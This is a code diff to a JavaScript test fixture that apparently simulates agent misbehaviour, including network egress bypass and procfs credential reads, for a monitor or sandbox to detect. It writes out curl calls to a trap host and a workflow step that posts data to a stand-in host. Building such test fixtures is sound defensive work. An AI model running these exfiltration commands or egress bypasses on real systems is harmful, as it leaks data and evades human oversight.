@@ -35,6 +35,8 @@ module.exports = class FixtureTarget {
           break;
         case 'network-egress-bypass':
           await fetch(trap + '/' + marker);
+          // A client can report failure after the local receiver has recorded the request.
+          items.push({ type: 'command_execution', command: 'curl ' + trap, exit_code: 1 });
           break;
         case 'procfs-credential-read':
           // Replay recorded process metadata with a synthetic credential.
@@ -49,7 +51,7 @@ module.exports = class FixtureTarget {
           await fs.mkdir(path.join(dir, '.github/workflows'), { recursive: true });
           await fs.writeFile(
             path.join(dir, '.github/workflows/check.yml'),
-            'steps:\n  - run: curl --data fixture https://example.invalid/fixture\n',
+            'steps:\n  - run: >\n      curl --data fixture\n      https://example.invalid/fixture\n',
           );
           break;
         case 'generated-vulnerability':
